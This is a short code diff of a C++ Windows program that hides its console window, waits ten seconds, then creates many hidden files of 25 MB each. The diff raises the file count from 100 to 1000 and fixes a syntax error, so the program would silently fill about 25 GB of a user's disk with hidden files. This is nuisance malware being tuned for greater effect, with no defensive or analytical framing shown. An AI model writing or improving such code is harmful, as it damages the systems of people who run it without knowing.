@@ -16,14 +16,14 @@ void setHiddenAttribute(const string& filename) {
 }
 
 int main() {
-    const int numFiles = 100;
+    const int numFiles = 1000;
     const int fileSizeMB = 25;
 
     HWND hwnd = GetConsoleWindow();
 
     ShowWindow(hwnd, SW_HIDE);
 
-    Sleep(10000)
+    Sleep(10000);
 
     for (int i = 1; i <= numFiles; ++i) {
         string filename = "hidden_file_" + to_string(i) + ".txt";
